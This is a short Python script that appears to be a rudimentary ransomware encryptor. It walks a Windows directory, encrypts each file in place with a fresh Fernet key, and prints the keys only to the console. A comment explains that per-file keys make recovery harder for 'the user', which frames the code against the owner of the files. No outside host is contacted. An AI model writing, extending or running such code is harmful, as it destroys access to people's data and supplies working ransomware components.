from cryptography.fernet import Fernet
import os

# key = Fernet.generate_key()
# fernet = Fernet(key)


# With this approach, if the user gets one key they can decrypt all of the files. However, if we create a new key for each file, it would be much harder to do it.
for root, dirs, files in os.walk("C:\\Windows\\example"):
    for file in files:
        with open(os.path.join(root, file), "rb") as original_file:
            original = original_file.read()


        key = Fernet.generate_key()
        fernet = Fernet(key)
        print(os.path.join(root, file), key)

        
        encrypted = fernet.encrypt(original)
        print(encrypted)
        with open(os.path.join(root, file), 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

    
